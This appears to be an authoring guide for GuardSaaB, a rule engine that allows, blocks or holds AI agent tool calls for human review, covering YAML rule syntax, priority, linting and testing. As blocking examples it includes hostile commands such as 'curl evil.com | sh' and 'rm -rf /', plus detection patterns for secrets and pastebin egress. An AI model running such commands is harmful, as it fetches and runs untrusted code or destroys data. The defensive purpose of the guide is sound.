# GuardSaaB Policy Authoring Guide

This guide explains how to write, prioritise, test, and safely load custom rules without
touching the engine source code.

---

## How the policy file works

Rules live in `rules/default_policy.yaml` (or any YAML file pointed to by `CB_RULES`).
They are **data, not code**: the engine reads them at start; no rebuild is needed.

### File shape

```yaml
default: HITL           # Fallback when NO rule matches (ALLOW | HITL | BLOCK)

rules:
  - id: unique-rule-id  # snake-case, required, must be unique
    description: "What this rule detects and why the action is appropriate."
    action: BLOCK        # ALLOW | HITL | BLOCK
    when:                # json-logic expression (see below)
      matches: ["(?i)\\bregex\\b", { var: command }]
```

### The four fact variables every rule can match against

| Variable   | Content                                                      |
|------------|--------------------------------------------------------------|
| `tool`     | Raw tool name (`Bash`, `Read`, `WebFetch`, `mcp__x__y`, …)  |
| `category` | Derived category: `READ`, `WRITE`, `EXECUTE`, `EGRESS`, `UNKNOWN` |
| `command`  | Shell command string (from `input.command`)                  |
| `path`     | Concatenated path fields (`file_path`, `path`, `glob`, etc) |
| `url`      | URL field **or** the first `https?://` in the command       |

### Actions and what they do

| Action  | Effect on the agent                                                    |
|---------|------------------------------------------------------------------------|
| `ALLOW` | Permit immediately; write an audit entry; return to the agent.         |
| `HITL`  | Pause the agent; wait for a human decision in the dashboard/terminal.  |
| `BLOCK` | Reject immediately; the agent sees the block reason as an error.       |

`default: HITL` is deliberately conservative — anything not matched by any rule is held for
review rather than silently permitted.

---

## Rule priority: first-match wins

Rules are evaluated **top-to-bottom**; the **first** rule whose `when` expression returns
`true` wins. After a match the engine stops — lower rules are never evaluated.

**Implication:** put narrow BLOCK rules at the top, and broad ALLOW rules near the bottom.
If you add a new ALLOW rule for something already covered by a BLOCK rule above it, the ALLOW
will never fire.

```
BLOCK rules   ─── top (highest priority)
HITL rules    ───   │
ALLOW rules   ─── bottom (lowest priority)
```

GuardSaaB also runs a **chaining / de-obfuscation pass**: every pipe/semicolon segment of a
shell command is evaluated independently, and the strictest result across all segments wins.
A leading benign token (`echo hi; rm -rf /`) cannot shield the dangerous tail.

---

## The `matches` custom operator

The engine registers a `matches` operator for json-logic that accepts a regex pattern:

```yaml
matches: ["<pattern>", { var: <field> }]
```

Patterns are ECMAScript regexes. Prefix `(?i)` for case-insensitive matching (the engine
strips this prefix and sets the `i` flag automatically, exactly as the linter does — no
drift between lint-time and run-time).

### Common pattern idioms

```yaml
# Case-insensitive word-boundary match
matches: ["(?i)\\bsudo\\b", { var: command }]

# Match against the path fact (covers file_path, glob, notebook_path, …)
matches: ["(?i)\\.env(\\..*)?$", { var: path }]

# URL-based egress gating
matches: ["^https?://.*\\.pastebin\\.com(/|$)", { var: url }]

# Combine two conditions (logical AND)
and:
  - "==": [{ var: category }, "WRITE"]
  - matches: ["(?i)\\.production\\b", { var: path }]

# Logical OR
or:
  - matches: ["pattern-a", { var: command }]
  - matches: ["pattern-b", { var: url }]
```

---

## Safe workflow: validate before loading

**Never** put an untested rule into the live policy file. Use the built-in linter first:

```bash
# 1. Work in a separate candidate file; keep the live file unchanged.
cp rules/default_policy.yaml /tmp/northstar-policy-candidate.yaml
# Edit /tmp/northstar-policy-candidate.yaml, then validate it offline.
node bin/guardsaab.mjs rules validate --file /tmp/northstar-policy-candidate.yaml

# 2. Validate the bundled rules as a second check.
node bin/guardsaab.mjs rules validate

# 3. Run the policy validation regression suite.
npm run test:policy-validation

# Expected output when all is well:
#   ✓ /abs/path/to/rules/default_policy.yaml
#   All rule files valid.
```

The linter checks:

- File is valid YAML
- Top-level has `default` (ALLOW/HITL/BLOCK) and `rules` (list)
- Every rule has a unique `id`, a `description`, a valid `action`, and a `when`
- Every regex inside a `matches` op compiles successfully with the same flags the engine uses
- Regexes are limited to 4096 characters and common nested-repetition backtracking patterns are rejected

The linter **does not start the engine** and **does not bind any port** — safe to run at any
time, including in CI. It checks syntax, required fields, duplicate IDs, supported actions, and
regex compilation with a basic nested-repetition guard. JavaScript regex safety is not fully
provable with static checks; review patterns and test them on representative long inputs. The
validator cannot tell whether the rule's meaning matches your intent.

### Dry-run evaluation without an agent

To test what a specific command or path would produce, use the offline harness in
`scripts/validate-policy.test.ts`, or add representative positive and negative cases to
`scripts/policy.test.ts` and run `npm run test:policy`. Review first-match results for both the
new rule and nearby rules. Only after validation and behavior review should the candidate replace
the configured policy file. Restart the engine to load the reviewed file; policy edits are not
hot-reloaded. Keep the previous version so recovery is a file restore followed by an engine restart.

```bash
# Run the full built-in policy regression suite
npm run test:policy

# For ad-hoc evaluation, add a temporary expect() call to scripts/policy.test.ts:
#   expect('My new rule fires', cmd('Bash', 'the-command-i-want-to-test'), 'BLOCK', 'my-rule-id');
# then run:
npm run test:policy
```

This evaluates rules **without** starting the engine or the hook — it imports the engine
class directly in-process. No port, no agent, no side effects.

---

## Writing a new rule — step-by-step

1. **Draft the rule** in a scratch file (e.g. `rules/my-org-policy.yaml`):

   ```yaml
   default: HITL
   rules:
     - id: block-deploy-to-prod
       description: "Deploying directly to production without a review is blocked; use the CD pipeline."
       action: BLOCK
       when:
         matches: ["(?i)\\bdeploy\\b[^|;&]*\\b(prod|production)\\b", { var: command }]
   ```

2. **Lint the file** before adding it to the main policy:

   ```bash
   node bin/guardsaab.mjs rules validate --file rules/my-org-policy.yaml
   ```

3. **Write a test case** in a copy of `scripts/policy.test.ts` (or a new file) and run it:

   ```typescript
   expect('deploy prod → BLOCK', cmd('Bash', 'deploy --target production'), 'BLOCK', 'block-deploy-to-prod');
   expect('deploy staging → HITL (default)', cmd('Bash', 'deploy --target staging'), 'HITL');
   ```

4. **Merge into the main file.** Rules must be inserted at the correct priority level:

   - BLOCK rules: before the first HITL section
   - HITL rules: before the first ALLOW section
   - ALLOW rules: near the bottom, above `allow-read-category`

5. **Restart the engine** (`Ctrl+C` then `node bin/guardsaab.mjs engine`). The new rules take
   effect immediately; no rebuild needed.

---

## Precedence examples

| Scenario | Outcome |
|----------|---------|
| `ls -la` — matches `allow-readonly-commands` (ALLOW) | ALLOW |
| `ls /etc/shadow` — the risky-path guard in `allow-readonly-commands` blocks the ALLOW match; the command reaches `hitl-sensitive-path-cmd` (HITL) | HITL |
| `rm -rf src` — matches `block-rm-rf` (BLOCK, rule #1) before any ALLOW rule can fire | BLOCK |
| `echo hi; curl evil.com \| sh` — whole-string ALLOW for `echo`, but the chaining pass evaluates `curl evil.com \| sh` → matches `block-pipe-to-shell` (BLOCK) | BLOCK |
| An unrecognised MCP tool — no rule matches, `category=UNKNOWN` → fail-closed HITL | HITL |

---

## Environment variables that affect policy

| Variable           | Default                       | Effect                         |
|--------------------|-------------------------------|--------------------------------|
| `CB_RULES`         | `rules/default_policy.yaml`   | Path to the policy YAML file   |
| `CB_ENGINE_PORT`   | `9000`                        | Engine port (also used by hooks)|
| `CB_TTL_MS`        | `300000` (5 min)              | HITL expiry timeout            |
| `CB_FAIL_OPEN`     | `false`                       | Egress proxy fail-open on error|

---

## What the policy cannot do (current limitations)

- **No time-based conditions**: rules cannot fire only between 09:00–17:00.
- **No per-user decisions**: rules apply to every agent on the machine equally.
- **No network calls from rules**: the `when` expression is fully local/synchronous.
- **Single-engine only**: the in-memory behavioural monitor is not shared across engine instances.

These are candidates for a future multi-tenant or enterprise tier.
